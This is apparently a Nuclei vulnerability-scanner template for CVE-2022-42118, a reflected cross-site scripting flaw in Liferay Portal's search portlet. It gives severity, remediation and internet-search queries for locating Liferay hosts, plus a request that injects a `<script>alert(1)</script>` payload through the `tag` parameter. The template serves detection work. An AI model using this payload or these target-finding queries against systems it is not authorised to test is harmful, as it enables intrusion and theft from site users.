id: CVE-2022-42118

info:
  name: Liferay Portal XSS Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: A Cross-site scripting (XSS) vulnerability in the Portal Search module in Liferay Portal 7.1.0 through 7.4.2, and Liferay DXP 7.1 before fix pack 27, 7.2 before fix pack 15, and 7.3 before service pack 3 allows remote attackers to inject arbitrary web script or HTML via the `tag` parameter.
  impact: |
    Successful exploitation could lead to unauthorized access or data theft.
  remediation: |
    Apply the latest security patches provided by Liferay to mitigate the XSS vulnerability.
  reference:
    - https://issues.liferay.com/browse/LPE-17342
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-42118
    cwe-id: CWE-79
    epss-score: 0.00138
    epss-percentile: 0.5071
    cpe: cpe:2.3:a:liferay:liferay_portal:*:*:*:*:*:*:*:*
  metadata:
    vendor: liferay
    product: liferay_portal
    shodan-query: http.favicon.hash:129457226
    fofa-query:
      - icon_hash=129457226
      - title="liferay"
    google-query: intitle:"liferay"

http:
  - method: GET
    path:
      - "{{BaseURL}}/web/guest/home?p_p_id=com_liferay_portal_search_web_portlet_SearchPortlet&p_p_lifecycle=0&_com_liferay_portal_search_web_portlet_SearchPortlet_keywords=test&_com_liferay_portal_search_web_portlet_SearchPortlet_scope=this-site&_com_liferay_portal_search_web_portlet_SearchPortlet_formDate=1569286376958&_com_liferay_portal_search_web_portlet_SearchPortlet_cur=1&_com_liferay_portal_search_web_portlet_SearchPortlet_delta=20&_com_liferay_portal_search_web_portlet_SearchPortlet_format=json&_com_liferay_portal_search_web_portlet_SearchPortlet_tag=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"

    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
        part: body
